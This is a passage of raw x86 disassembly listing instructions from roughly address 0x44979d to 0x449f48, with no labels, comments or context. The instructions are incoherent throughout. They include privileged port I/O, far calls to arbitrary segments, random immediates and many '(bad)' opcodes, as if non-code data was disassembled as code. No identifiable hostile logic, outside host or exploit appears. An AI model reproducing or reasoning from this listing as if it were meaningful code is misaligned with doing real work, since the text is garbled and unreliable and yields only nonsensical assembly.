  44979d:	out    dx,al
  44979e:	or     dl,BYTE PTR [ecx-0x58c6d16e]
  4497a4:	cmp    esp,esi
  4497a6:	pusha  
  4497a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4497a8:	stc    
  4497a9:	ret    0xddd6
  4497ac:	mov    dl,0x2c
  4497ae:	rol    dl,0x7c
  4497b1:	in     eax,dx
  4497b2:	mov    esp,0x79fb3389
  4497b7:	test   al,0xa5
  4497b9:	ins    DWORD PTR es:[edi],dx
  4497ba:	sar    DWORD PTR [ebp+edi*8+0x3e],1
  4497be:	cli    
  4497bf:	or     ecx,DWORD PTR [edi]
  4497c1:	pop    edi
  4497c2:	lods   eax,DWORD PTR ds:[esi]
  4497c3:	push   ds
  4497c4:	mov    dl,0x3b
  4497c6:	jne    0x4497f9
  4497c8:	xchg   ebx,eax
  4497c9:	mov    fs,WORD PTR [edi-0x62]
  4497cc:	ror    BYTE PTR [ebx],0x3b
  4497cf:	scas   eax,DWORD PTR es:[edi]
  4497d0:	aad    0x41
  4497d2:	out    0xe9,al
  4497d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4497d5:	push   ecx
  4497d6:	call   0xe709:0xecce3f69
  4497dd:	add    BYTE PTR [ebx-0x59],dh
  4497e0:	(bad)  
  4497e1:	(bad)  
  4497e2:	ss cmp eax,0x6399f353
  4497e8:	mov    dl,0x69
  4497ea:	aad    0xb9
  4497ec:	or     BYTE PTR [ecx-0x6a],al
  4497ef:	retf   0xbd1
  4497f2:	push   0x1d7f3eb6
  4497f7:	ins    BYTE PTR es:[edi],dx
  4497f8:	jmp    0x1412328f
  4497fd:	iret   
  4497fe:	aad    0x27
  449800:	mov    esp,0x6aa7f81b
  449805:	js     0x4497a9
  449807:	jge    0x4497f6
  449809:	scas   eax,DWORD PTR es:[edi]
  44980a:	xor    esi,esi
  44980c:	sahf   
  44980d:	push   0x6db27e5a
  449812:	push   es
  449813:	sub    eax,0xa7753e32
  449818:	fcmovne st,st(0)
  44981a:	lock test al,0xda
  44981d:	mov    esp,0x26b2033f
  449822:	jae    0x449852
  449824:	xchg   edi,eax
  449825:	stos   DWORD PTR es:[edi],eax
  449826:	rcl    bl,0x4a
  449829:	or     edx,DWORD PTR [edi+0x66babb54]
  44982f:	mov    cl,0x58
  449831:	sub    al,0x87
  449833:	jbe    0x4497c5
  449835:	js     0x449854
  449837:	pop    ebp
  449838:	mov    ecx,0x1a73aac6
  44983d:	cmp    eax,0x7b5ca7e0
  449842:	mov    ch,0x4a
  449844:	jmp    0x4497d6
  449846:	mov    bh,0x90
  449848:	mov    esp,0x65c7b250
  44984d:	xchg   esi,eax
  44984e:	pop    edx
  44984f:	mov    edi,0xd33a44ff
  449854:	pop    ds
  449855:	or     ebp,DWORD PTR [edi+0x5]
  449858:	xchg   edx,eax
  449859:	dec    eax
  44985a:	idiv   BYTE PTR [ebx+ebx*1]
  44985d:	dec    esi
  44985e:	call   0x3894:0xe3664672
  449865:	imul   ecx,DWORD PTR [edi],0xffffffa6
  449868:	xchg   DWORD PTR [eax-0x16c54e0b],eax
  44986e:	in     eax,dx
  44986f:	outs   dx,DWORD PTR ds:[esi]
  449870:	mov    es,edi
  449872:	add    cl,bl
  449874:	xchg   esp,eax
  449875:	mov    ebx,0x79bde592
  44987a:	les    ebp,FWORD PTR [eax-0x33]
  44987d:	mov    ebp,DWORD PTR [edx+eiz*4+0x5]
  449881:	push   ss
  449882:	test   BYTE PTR [eax-0x1f64e878],ch
  449888:	xchg   edx,eax
  449889:	test   ch,0x8d
  44988c:	jae    0x449840
  44988e:	call   0x2ea9:0x54681b39
  449895:	xchg   BYTE PTR [edx],ch
  449897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449898:	les    edx,FWORD PTR [edx+0x2403e037]
  44989e:	sbb    BYTE PTR [esi-0x50d1804b],dh
  4498a4:	loopne 0x449873
  4498a6:	pop    edx
  4498a7:	jb     0x449834
  4498a9:	test   eax,0x1be7a41d
  4498ae:	adc    al,bh
  4498b0:	mov    dh,0xe8
  4498b2:	pop    edx
  4498b3:	cwde   
  4498b4:	out    0x75,al
  4498b6:	test   BYTE PTR [eax-0x45],dl
  4498b9:	clc    
  4498ba:	call   0xfa9d:0x20881139
  4498c1:	add    eax,0x86706080
  4498c6:	fld    DWORD PTR ds:0xc4614533
  4498cc:	sbb    dh,bl
  4498ce:	in     al,dx
  4498cf:	in     al,dx
  4498d0:	mov    dl,0x8c
  4498d2:	addr16 mov cl,0xf1
  4498d5:	fisub  WORD PTR [ecx-0x11]
  4498d8:	sti    
  4498d9:	pop    ss
  4498da:	push   esp
  4498db:	retf   
  4498dc:	and    eax,0x9cc718cb
  4498e1:	pop    ebx
  4498e2:	fsub   DWORD PTR [esi-0x3d]
  4498e5:	les    ebx,FWORD PTR [edx-0x7d8391de]
  4498eb:	div    dl
  4498ed:	xor    BYTE PTR [ecx-0x59],al
  4498f0:	(bad)  
  4498f1:	cmp    al,0x14
  4498f3:	lea    ebx,[ebx+ebp*1+0x60]
  4498f7:	shl    BYTE PTR [edx+0x640e00fd],cl
  4498fd:	push   cs
  4498fe:	ror    DWORD PTR [edi-0x4],0xb
  449902:	sub    ebp,DWORD PTR [esi]
  449904:	outs   dx,BYTE PTR ds:[esi]
  449905:	xor    al,0x61
  449907:	inc    esp
  449908:	push   edi
  449909:	pushf  
  44990a:	jl     0x4498e5
  44990c:	push   esp
  44990d:	out    0x9a,al
  44990f:	add    BYTE PTR [ecx+0x1079a763],bl
  449915:	cmp    eax,0xc6adbb65
  44991a:	jle    0x449943
  44991c:	aam    0xc7
  44991e:	mov    edi,0x8594e477
  449923:	cmp    DWORD PTR [eax+0x68],0xcb5e309a
  44992a:	mov    eax,ds:0xaa0ab966
  44992f:	push   ebp
  449930:	push   edx
  449931:	shl    BYTE PTR [ebp+0x25],cl
  449934:	cs ret 
  449936:	je     0x449921
  449938:	test   DWORD PTR [ebp+0x1c],ebp
  44993b:	mov    bh,0x62
  44993d:	aam    0xfd
  44993f:	dec    DWORD PTR [ebx-0x29598186]
  449945:	loopne 0x449938
  449947:	xor    al,0x4a
  449949:	adc    eax,0x354b57b1
  44994e:	call   0xa5e0:0xbcd8862f
  449955:	int    0xfa
  449957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449958:	mov    BYTE PTR [edi],ah
  44995a:	push   esp
  44995b:	sbb    ebp,DWORD PTR [eax+0x29]
  44995e:	test   al,0xb2
  449961:	test   esp,edx
  449963:	ja     0x449952
  449965:	lods   al,BYTE PTR ds:[esi]
  449966:	cs test eax,0x7f550b89
  44996c:	xlat   BYTE PTR ds:[ebx]
  44996d:	mov    ds:0x61cdb1aa,al
  449972:	xchg   ebp,eax
  449973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449974:	shr    bh,1
  449976:	fdiv   st(2),st
  449978:	leave  
  449979:	das    
  44997a:	cmp    BYTE PTR [eax-0x7678b6a],0x4f
  449981:	std    
  449982:	cli    
  449983:	mov    DWORD PTR [eax+0x5066ebc1],0x12a5e429
  44998d:	(bad)  
  44998f:	cmp    edi,DWORD PTR [ebp+0x5ebc3985]
  449995:	push   ss
  449996:	ficomp DWORD PTR ds:0x4c56900c
  44999c:	mov    eax,ds:0xc5f6a909
  4499a1:	add    al,ch
  4499a3:	add    eax,0xcf2c4372
  4499a8:	dec    edx
  4499a9:	mov    ds:0x9f7a2598,eax
  4499ae:	dec    ebp
  4499af:	jne    0x449a19
  4499b1:	retf   
  4499b2:	(bad)  
  4499b3:	int    0x3f
  4499b5:	or     esi,DWORD PTR [edx+ebp*8-0x25]
  4499b9:	xor    eax,DWORD PTR [esp+0x109a1bf2]
  4499c0:	xor    al,0xad
  4499c2:	(bad)  
  4499c3:	jg     0x44998d
  4499c5:	dec    ecx
  4499c6:	aaa    
  4499c7:	mov    edx,0xa5309480
  4499cc:	loope  0x449a43
  4499ce:	sar    BYTE PTR [edx],0x32
  4499d1:	(bad)  
  4499d3:	push   cs
  4499d4:	stos   BYTE PTR es:[edi],al
  4499d5:	xchg   ebx,eax
  4499d6:	call   0x3bd1:0xe24e525f
  4499dd:	xchg   esi,edi
  4499df:	mov    al,ds:0xfed137e0
  4499e4:	xor    bl,bl
  4499e6:	sub    cl,BYTE PTR [ebx+0xd]
  4499e9:	cmc    
  4499ea:	call   0x80f2:0xb3aab33e
  4499f1:	cs push edi
  4499f3:	test   al,0x3f
  4499f5:	cmp    ah,BYTE PTR [ebp+0x7d33fcdb]
  4499fb:	push   ebp
  4499fc:	outs   dx,DWORD PTR ds:[esi]
  4499fd:	cld    
  4499fe:	imul   esi,DWORD PTR [edi],0xbab70d07
  449a04:	mov    dl,0xa3
  449a06:	jge    0x449a0b
  449a08:	mov    BYTE PTR [ebx+0x21],dl
  449a0b:	pop    ecx
  449a0c:	add    edx,DWORD PTR [esi]
  449a0e:	pop    ebp
  449a0f:	dec    ebx
  449a10:	or     edi,DWORD PTR cs:[esi+0x3e]
  449a14:	push   ecx
  449a15:	not    BYTE PTR [ecx]
  449a17:	dec    ebp
  449a18:	mov    ecx,0x42f649ab
  449a1d:	mov    esi,DWORD PTR [ecx+0x5ec81c06]
  449a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449a24:	cld    
  449a25:	dec    ebx
  449a26:	cmp    al,0xe
  449a28:	xlat   BYTE PTR ds:[ebx]
  449a29:	push   cs
  449a2a:	sbb    bl,bl
  449a2c:	mov    dl,0x28
  449a2e:	je     0x449a83
  449a30:	icebp  
  449a31:	repz or bh,al
  449a34:	dec    BYTE PTR [ebx]
  449a36:	jmp    0x449a1b
  449a38:	bound  esp,QWORD PTR [edi+0x6a]
  449a3b:	mov    al,0xb
  449a3d:	xchg   edi,eax
  449a3e:	popf   
  449a3f:	mov    ebx,0x408015f4
  449a44:	adc    bh,0xe3
  449a47:	(bad)  
  449a48:	scas   al,BYTE PTR es:[edi]
  449a49:	daa    
  449a4a:	in     eax,dx
  449a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449a4c:	cwde   
  449a4d:	mov    eax,0x702848c9
  449a52:	add    cl,BYTE PTR [ebp+ebp*1-0x69]
  449a56:	xchg   ebp,eax
  449a57:	add    al,BYTE PTR [ebp+0x2727d23a]
  449a5d:	xor    DWORD PTR [ebx+0x6f],eax
  449a60:	push   es
  449a61:	or     edi,DWORD PTR [ebx+0x61391806]
  449a67:	pop    esi
  449a68:	jg     0x449a1d
  449a6a:	loop   0x449a64
  449a6c:	mov    dl,0x8c
  449a6e:	aas    
  449a6f:	daa    
  449a70:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  449a72:	jbe    0x449a25
  449a74:	pop    edi
  449a75:	or     ebx,DWORD PTR [esp+eiz*8+0x60be1630]
  449a7c:	adc    eax,0xe60a9d83
  449a81:	popf   
  449a82:	push   esp
  449a83:	js     0x449af8
  449a85:	push   edi
  449a86:	add    esp,ebx
  449a88:	push   edx
  449a89:	jno    0x449a24
  449a8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449a8c:	hlt    
  449a8d:	fistp  WORD PTR [ebx-0x2f84f4f4]
  449a93:	mov    ?,WORD PTR [edx-0x524f9880]
  449a99:	adc    BYTE PTR [edx+0x570ac94a],dl
  449a9f:	push   esp
  449aa0:	inc    DWORD PTR [ecx+0x7bb52700]
  449aa6:	aam    0x89
  449aa8:	mov    dl,0x83
  449aaa:	inc    ebp
  449aab:	sbb    eax,0xdcb5ff60
  449ab0:	or     ah,bh
  449ab2:	and    eax,0x79a91a7
  449ab7:	sub    BYTE PTR [eax],dl
  449ab9:	push   edx
  449aba:	clc    
  449abb:	in     eax,dx
  449abc:	ret    
  449abd:	dec    esi
  449abe:	outs   dx,DWORD PTR ds:[esi]
  449abf:	jg     0x449a74
  449ac1:	cmp    ebx,DWORD PTR [edx-0x967a2ae]
  449ac7:	add    ch,ch
  449ac9:	fsubr  DWORD PTR [eax]
  449acb:	mov    al,ds:0x23c46f95
  449ad0:	dec    edx
  449ad1:	stos   DWORD PTR es:[edi],eax
  449ad2:	mov    eax,ds:0x8925ab8d
  449ad7:	xchg   ebx,eax
  449ad8:	mov    esi,0xbc5976aa
  449add:	imul   esp,DWORD PTR [esi-0x191daf27],0x13e63229
  449ae7:	jl     0x449a74
  449ae9:	sbb    al,BYTE PTR [edi+0x1aa1c892]
  449aef:	inc    edx
  449af0:	out    0x1f,al
  449af2:	clc    
  449af3:	mov    edi,0xa7e1ef48
  449af8:	pop    es
  449af9:	fld    QWORD PTR [eax+0x6]
  449afc:	stc    
  449afd:	in     al,dx
  449afe:	mov    esi,0x94f4c353
  449b03:	sbb    al,0x1b
  449b05:	sub    al,bh
  449b07:	mov    bl,0xb3
  449b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449b0a:	sub    BYTE PTR [ebx-0x4b66f2d5],ah
  449b10:	add    BYTE PTR [edi-0x64],0xc5
  449b14:	(bad)  
  449b15:	sbb    ch,dl
  449b17:	out    dx,eax
  449b18:	mov    ds:0xaa852a9a,al
  449b1d:	dec    esi
  449b1e:	push   0xffffffbd
  449b20:	xor    BYTE PTR [ebx],0x9b
  449b23:	aad    0x3b
  449b25:	inc    ebx
  449b26:	sar    BYTE PTR [edi-0x3876fd82],1
  449b2c:	adc    al,BYTE PTR [edi+0x3b]
  449b2f:	lods   al,BYTE PTR ds:[esi]
  449b30:	push   edx
  449b31:	mov    ds:0xf562c5f,eax
  449b36:	mov    ah,0xd7
  449b38:	lock dec ebx
  449b3a:	mov    ebx,0x8bab4b2f
  449b3f:	jg     0x449b44
  449b41:	or     BYTE PTR [esi+0x522acc23],cl
  449b47:	pop    esi
  449b48:	push   edx
  449b49:	sbb    DWORD PTR [edx-0x7b],ebp
  449b4c:	cli    
  449b4d:	or     BYTE PTR [ebp+0x6beababa],ah
  449b53:	xchg   DWORD PTR [esi],edi
  449b55:	xor    BYTE PTR [edx-0x2687cdee],ah
  449b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449b5c:	cmp    ah,BYTE PTR [ebx]
  449b5e:	or     eax,DWORD PTR [edi+0x25bc4b98]
  449b64:	mov    eax,0xb392bfb1
  449b69:	frstor [edx-0x637a283f]
  449b6f:	clc    
  449b70:	in     al,dx
  449b71:	sub    BYTE PTR [edx-0x677f2f3c],dl
  449b77:	and    ebx,esp
  449b79:	sti    
  449b7a:	sbb    esp,DWORD PTR [esi+esi*1]
  449b7d:	mov    ebx,0x173ad6ac
  449b82:	cmp    eax,0x405d1002
  449b87:	mov    ebx,0xce424c71
  449b8c:	ficomp DWORD PTR [ebx]
  449b8e:	pop    es
  449b8f:	xchg   esi,eax
  449b90:	and    BYTE PTR [esp+edi*2],0xc0
  449b94:	loope  0x449bfe
  449b96:	adc    bl,BYTE PTR [ecx-0x4d]
  449b99:	pushf  
  449b9a:	pop    es
  449b9b:	cmp    DWORD PTR [esi+0x296339af],edi
  449ba1:	into   
  449ba2:	and    al,cl
  449ba4:	mov    dl,0xf0
  449ba6:	and    ebp,DWORD PTR [edx+0x7d]
  449ba9:	hlt    
  449baa:	sub    bh,BYTE PTR [edi+0x53]
  449bad:	jecxz  0x449bfd
  449baf:	fwait
  449bb0:	jb     0x449b52
  449bb2:	xchg   ebp,eax
  449bb3:	bound  ecx,QWORD PTR [esi]
  449bb5:	mov    esi,0x1b746e1d
  449bba:	ins    DWORD PTR es:[edi],dx
  449bbb:	jmp    ebp
  449bbd:	pop    ebp
  449bbe:	call   0xca9e41ea
  449bc3:	scas   eax,DWORD PTR es:[edi]
  449bc4:	into   
  449bc5:	loopne 0x449be1
  449bc7:	push   es
  449bc8:	sbb    esp,DWORD PTR [eax-0x443ceb71]
  449bce:	popf   
  449bcf:	outs   dx,BYTE PTR ds:[esi]
  449bd0:	or     al,cl
  449bd2:	pop    edi
  449bd3:	pop    eax
  449bd4:	xor    ebp,ebp
  449bd6:	jbe    0x449bdf
  449bd8:	sbb    eax,0x275764f8
  449bdd:	sti    
  449bde:	pop    si
  449be0:	pop    esi
  449be1:	mov    dl,0x1c
  449be3:	pop    edi
  449be4:	pop    ecx
  449be5:	xor    eax,0xc6bd2926
  449bea:	xor    esi,DWORD PTR ss:0x4cb656db
  449bf1:	jle    0x449be1
  449bf3:	bound  edx,QWORD PTR ds:0xb9279024
  449bf9:	ja     0x449bc2
  449bfb:	addr16 sub al,0xac
  449bfe:	xor    ebp,DWORD PTR [ecx-0x58af45ce]
  449c04:	add    bh,cl
  449c06:	pop    esp
  449c07:	pop    ecx
  449c08:	pop    ds
  449c09:	in     al,0x60
  449c0b:	pop    eax
  449c0c:	fcom   QWORD PTR [esp+eiz*2-0x6d13dbdf]
  449c13:	(bad)  
  449c14:	xor    dh,dl
  449c16:	sbb    bl,dl
  449c18:	arpl   WORD PTR [ebx-0x7],ax
  449c1b:	mov    ds:0x3c4d02d3,eax
  449c20:	aam    0xfa
  449c22:	push   ebp
  449c23:	jbe    0x449bef
  449c25:	xchg   esi,eax
  449c26:	mov    dh,BYTE PTR [ebp+0x35]
  449c29:	cmc    
  449c2a:	out    0xdb,eax
  449c2c:	mov    ds:0xe6f0c6a3,al
  449c31:	pop    ecx
  449c32:	popf   
  449c33:	fistp  DWORD PTR [eax+ecx*1]
  449c36:	cmp    cl,BYTE PTR [esp+ebx*1]
  449c39:	or     DWORD PTR [edx],esi
  449c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449c3c:	mov    al,0xb9
  449c3e:	sub    esp,DWORD PTR [ebp+esi*2-0xb]
  449c42:	cmp    DWORD PTR [edx-0x42],ecx
  449c45:	mul    BYTE PTR [ebp+0x37]
  449c48:	push   esi
  449c49:	sti    
  449c4a:	sbb    eax,ebp
  449c4c:	outs   dx,BYTE PTR ds:[esi]
  449c4d:	add    ebp,ebp
  449c4f:	jg     0x449c04
  449c51:	ins    BYTE PTR es:[edi],dx
  449c52:	dec    ebx
  449c53:	pop    esp
  449c54:	inc    esi
  449c55:	mov    ah,0x12
  449c57:	(bad)  
  449c59:	sbb    ebx,DWORD PTR [ecx+0x2d]
  449c5c:	cmc    
  449c5d:	jae    0x449c79
  449c5f:	pusha  
  449c60:	aaa    
  449c61:	ja     0x449c36
  449c63:	mov    eax,0xa7f39b7a
  449c68:	push   edx
  449c69:	(bad)  
  449c6a:	inc    esi
  449c6b:	pop    ecx
  449c6c:	fldenv [ecx+0x6a]
  449c6f:	cs mov eax,0xb1c3fd67
  449c75:	mov    ecx,edi
  449c77:	out    0x21,eax
  449c79:	popf   
  449c7a:	or     eax,0x59b39ad2
  449c7f:	pop    edi
  449c80:	pop    esi
  449c81:	in     eax,dx
  449c82:	xchg   edx,eax
  449c83:	pop    edi
  449c84:	dec    ebp
  449c85:	(bad)  
  449c86:	jp     0x449c47
  449c88:	(bad)  
  449c89:	cli    
  449c8a:	icebp  
  449c8b:	je     0x449d03
  449c8d:	add    eax,esp
  449c8f:	ja     0x449c48
  449c91:	inc    esi
  449c92:	pop    esp
  449c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449c94:	xor    bh,BYTE PTR [edi-0x4da56914]
  449c9a:	out    0x90,eax
  449c9c:	dec    eax
  449c9d:	mov    al,0xa4
  449c9f:	daa    
  449ca0:	mov    BYTE PTR [edi],dh
  449ca2:	and    BYTE PTR [ecx-0x21d8ec76],bl
  449ca8:	mov    edx,0xc2f70bc8
  449cad:	pop    DWORD PTR [ebp+0x43]
  449cb0:	dec    esi
  449cb1:	add    ebx,edx
  449cb3:	loopne 0x449ca9
  449cb5:	pop    edx
  449cb6:	out    0x50,al
  449cb8:	xor    edx,DWORD PTR [edi-0x48f069c6]
  449cbe:	push   edx
  449cbf:	pop    edi
  449cc0:	and    al,BYTE PTR [ebx+0x41]
  449cc3:	(bad)  
  449cc4:	stos   BYTE PTR es:[edi],al
  449cc5:	jb     0x449d0e
  449cc7:	inc    edi
  449cc8:	(bad)  
  449cc9:	fcomp  QWORD PTR [edi+ebp*4-0x23]
  449ccd:	fisub  WORD PTR [ebx-0x19]
  449cd0:	jge    0x449d2d
  449cd2:	clc    
  449cd3:	imul   edi,DWORD PTR [edx+0x32265a35],0xffffffa6
  449cda:	test   BYTE PTR [edx-0x2513e47e],0x9d
  449ce1:	pop    ds
  449ce2:	and    bl,bl
  449ce4:	test   BYTE PTR [ebx+0xdc5105f],al
  449cea:	or     bl,BYTE PTR [edx]
  449cec:	les    edx,FWORD PTR [ebx]
  449cee:	mov    esp,0x941f1066
  449cf3:	addr16 or eax,0xfaeb7e4b
  449cf9:	dec    esi
  449cfa:	xor    DWORD PTR [edx+ecx*8],0x7d
  449cfe:	xchg   esp,eax
  449cff:	or     DWORD PTR [eax],eax
  449d01:	or     DWORD PTR [edx],ebp
  449d03:	es sbb eax,0x3b6b00c1
  449d09:	loope  0x449cf4
  449d0b:	jns    0x449d41
  449d0d:	addr16 jmp 0x449d6e
  449d10:	xlat   BYTE PTR ds:[ebx]
  449d11:	jle    0x449ca6
  449d13:	int    0xfa
  449d15:	test   esi,0x958be332
  449d1b:	call   0x14d4:0xe38f20c
  449d22:	pop    edx
  449d23:	scas   eax,DWORD PTR es:[edi]
  449d24:	ret    
  449d25:	and    DWORD PTR [eax+0x11],esp
  449d28:	call   0xa375:0x9227ae71
  449d2f:	(bad)  
  449d30:	leave  
  449d31:	repz das 
  449d33:	aad    0x9c
  449d35:	sti    
  449d36:	pop    eax
  449d37:	fisub  DWORD PTR [edx]
  449d39:	xchg   ebx,eax
  449d3a:	mov    gs,WORD PTR [edi+0xf]
  449d3d:	mov    dl,0x2a
  449d3f:	sahf   
  449d40:	fmul   QWORD PTR [esi]
  449d42:	add    ah,dl
  449d44:	fbld   TBYTE PTR [ecx+0x0]
  449d47:	aas    
  449d48:	add    BYTE PTR [edx-0x4610a026],ch
  449d4e:	sahf   
  449d4f:	addr16 jbe 0x449d47
  449d52:	jecxz  0x449d9b
  449d54:	xor    edi,edi
  449d56:	idiv   BYTE PTR [edi+0x3]
  449d59:	repnz xchg ebx,eax
  449d5b:	(bad)  
  449d5c:	fs or  bh,dh
  449d5f:	jbe    0x449d14
  449d61:	push   ebx
  449d62:	push   ebp
  449d63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449d64:	cld    
  449d65:	rcr    BYTE PTR [edx+0x60fc0f9b],0x1
  449d6c:	xchg   esi,eax
  449d6d:	imul   eax,DWORD PTR [ecx-0x4399455d],0x2d1e4a85
  449d77:	(bad)  [eax+0x3e9bb28f]
  449d7d:	dec    edx
  449d7e:	in     al,dx
  449d7f:	ja     0x449d41
  449d81:	cmp    esp,DWORD PTR [edx+0x1b]
  449d84:	sahf   
  449d85:	cmp    ebp,0x1bc4aeb3
  449d8b:	pop    ebp
  449d8c:	cld    
  449d8d:	inc    eax
  449d8e:	rcl    DWORD PTR [esi+0x7a77fc],cl
  449d94:	add    al,0xb1
  449d96:	call   0x23f8543e
  449d9b:	jnp    0x449dd6
  449d9d:	fistp  DWORD PTR [ebx]
  449d9f:	push   esi
  449da0:	fcom   st(1)
  449da2:	add    esi,DWORD PTR [edi-0x3f]
  449da5:	repnz jecxz 0x449dc1
  449da8:	mov    ebx,0xe9f34e2b
  449dad:	test   eax,0xff417fe7
  449db3:	ins    DWORD PTR es:[edi],dx
  449db4:	mov    edx,0x1027d830
  449db9:	push   esi
  449dba:	(bad)  
  449dbb:	out    0xb6,eax
  449dbd:	arpl   WORD PTR [edx-0x14dcdde9],di
  449dc3:	mov    ecx,DWORD PTR [edx+0x43]
  449dc6:	loopne 0x449def
  449dc8:	mov    esi,0xba99e4b3
  449dcd:	jo     0x449dce
  449dcf:	pushf  
  449dd0:	stos   BYTE PTR es:[edi],al
  449dd1:	js     0x449d72
  449dd3:	aaa    
  449dd4:	or     al,0x73
  449dd6:	cdq    
  449dd7:	sub    esi,DWORD PTR [ecx-0x46]
  449dda:	xor    al,BYTE PTR [eax+0x45]
  449ddd:	jno    0x449d99
  449ddf:	or     eax,0x36f165c6
  449de4:	mov    dh,0xdd
  449de6:	or     cl,BYTE PTR [ecx-0x4a]
  449de9:	mov    ebp,0xcf7316cd
  449dee:	pop    eax
  449def:	retf   
  449df0:	push   eax
  449df1:	dec    edx
  449df2:	loop   0x449dbe
  449df4:	cmp    edi,edx
  449df6:	out    0x7d,eax
  449df8:	add    bh,bl
  449dfa:	sti    
  449dfb:	jne    0x449e1d
  449dfd:	jae    0x449e1b
  449dff:	fild   DWORD PTR [ebx-0x7750adb4]
  449e05:	mov    bh,0xda
  449e07:	daa    
  449e08:	sub    al,0x53
  449e0a:	mov    DWORD PTR [ebp+0x17],ebx
  449e0d:	cdq    
  449e0e:	sahf   
  449e0f:	xchg   DWORD PTR [ecx],ebx
  449e11:	mov    ss,WORD PTR ds:0x39c7
  449e16:	bound  edx,QWORD PTR [ebx-0x54e71c32]
  449e1c:	mov    WORD PTR [ecx-0x62],es
  449e1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449e20:	ds mov esi,0xb1b6e7ea
  449e26:	sbb    eax,0xc283d6ef
  449e2b:	cmp    edx,DWORD PTR [edx+esi*8+0x28f4af92]
  449e32:	out    dx,eax
  449e33:	mov    ebx,0x18224905
  449e38:	daa    
  449e39:	fistp  DWORD PTR [ebx-0x3e]
  449e3c:	fsubr  DWORD PTR [edi-0xe]
  449e3f:	shr    ebx,1
  449e41:	shr    edx,1
  449e43:	and    eax,edx
  449e45:	fcom   QWORD PTR [eax-0x2f7cb101]
  449e4b:	ins    BYTE PTR es:[edi],dx
  449e4c:	mov    edx,0xf3ab5348
  449e51:	int3   
  449e52:	xchg   edx,eax
  449e53:	nop
  449e54:	loop   0x449e07
  449e56:	sbb    bh,BYTE PTR [ebx]
  449e58:	mov    WORD PTR [esi-0x78],ds
  449e5b:	adc    dl,BYTE PTR cs:[edi-0x74]
  449e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449e60:	cmp    ch,BYTE PTR [esi-0x46]
  449e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449e64:	frstor [eax]
  449e66:	jns    0x449e7d
  449e68:	cli    
  449e69:	cli    
  449e6a:	xchg   esi,eax
  449e6b:	jecxz  0x449e9f
  449e6d:	jl     0x449e31
  449e6f:	call   0xcbb6:0xabe82dae
  449e76:	loope  0x449e5a
  449e78:	lods   eax,DWORD PTR ds:[esi]
  449e79:	push   esp
  449e7a:	sub    BYTE PTR [ecx-0x264faf11],ch
  449e80:	into   
  449e81:	pop    esp
  449e82:	mov    BYTE PTR [eax],cl
  449e84:	mov    dh,0x73
  449e86:	(bad)  
  449e87:	sbb    DWORD PTR [edx-0x1],esi
  449e8a:	data16 ficom DWORD PTR [ebx+0x53]
  449e8e:	outs   dx,BYTE PTR ds:[esi]
  449e8f:	iret   
  449e90:	(bad)  
  449e91:	repnz in al,0xe3
  449e94:	xor    dl,al
  449e96:	sahf   
  449e97:	shl    BYTE PTR [edi+0x1],0xd5
  449e9b:	pop    ebx
  449e9c:	and    ecx,DWORD PTR [esi-0x48]
  449e9f:	out    0xe6,al
  449ea1:	dec    ebx
  449ea2:	push   ds
  449ea3:	xchg   edx,eax
  449ea4:	mov    WORD PTR [eax+0x5928286c],?
  449eaa:	xchg   ebp,eax
  449eab:	add    ebp,DWORD PTR [edi]
  449ead:	push   ebx
  449eae:	cdq    
  449eaf:	push   es
  449eb0:	in     eax,dx
  449eb1:	adc    DWORD PTR [edx+0x0],edi
  449eb4:	aad    0x2e
  449eb6:	adc    edx,DWORD PTR [edi+0x33a07fb3]
  449ebc:	dec    edx
  449ebd:	jle    0x449edd
  449ebf:	rol    DWORD PTR [ebx+0x2b],cl
  449ec2:	xchg   esi,eax
  449ec3:	adc    dl,ah
  449ec5:	jns    0x449ed9
  449ec7:	mov    WORD PTR gs:[ebp-0x66d944ea],ss
  449ece:	fld    TBYTE PTR [edx+eax*8+0x66]
  449ed2:	icebp  
  449ed3:	mov    ds:0x11398bf8,eax
  449ed8:	cmp    bh,BYTE PTR [edi-0x3c49e834]
  449ede:	push   ecx
  449edf:	pop    ecx
  449ee0:	shl    esp,0x8
  449ee3:	fist   DWORD PTR [eax+0x9]
  449ee6:	in     eax,0x7a
  449ee8:	mov    bh,0x73
  449eea:	fisubr WORD PTR [edi]
  449eec:	jmp    0x7f253bca
  449ef1:	repnz pop edi
  449ef3:	push   esi
  449ef4:	(bad)  
  449ef5:	ret    
  449ef6:	mov    eax,0x1c886a3
  449efb:	dec    edi
  449efc:	sub    bl,BYTE PTR [ebx-0x6a]
  449eff:	pop    ebp
  449f00:	sub    DWORD PTR ds:0x9420b6cf,esi
  449f06:	shl    DWORD PTR [ebx-0x5c07504a],0x1a
  449f0d:	bound  ecx,QWORD PTR [eax-0x63c1dd52]
  449f13:	sub    eax,ebx
  449f15:	repz mov dl,0x15
  449f18:	ror    BYTE PTR [edi+0x7c214be],0x15
  449f1f:	fcom   st(2)
  449f21:	mov    ebx,DWORD PTR [esi+0x66]
  449f24:	jo     0x449f16
  449f26:	iret   
  449f27:	mov    bl,0xea
  449f29:	push   edx
  449f2a:	mov    BYTE PTR [edi],ah
  449f2c:	sbb    BYTE PTR [ebx],cl
  449f2e:	daa    
  449f2f:	pop    ds
  449f30:	add    al,0x8c
  449f32:	push   ebx
  449f33:	sbb    eax,0x6a65001f
  449f38:	sbb    ecx,DWORD PTR [edi+0x662af319]
  449f3e:	sub    BYTE PTR [edi],0x34
  449f41:	pop    edx
  449f42:	xor    dl,dl
  449f44:	test   dl,al
  449f46:	pop    edx
  449f47:	iret   
  449f48:	mov    bl,0xeb
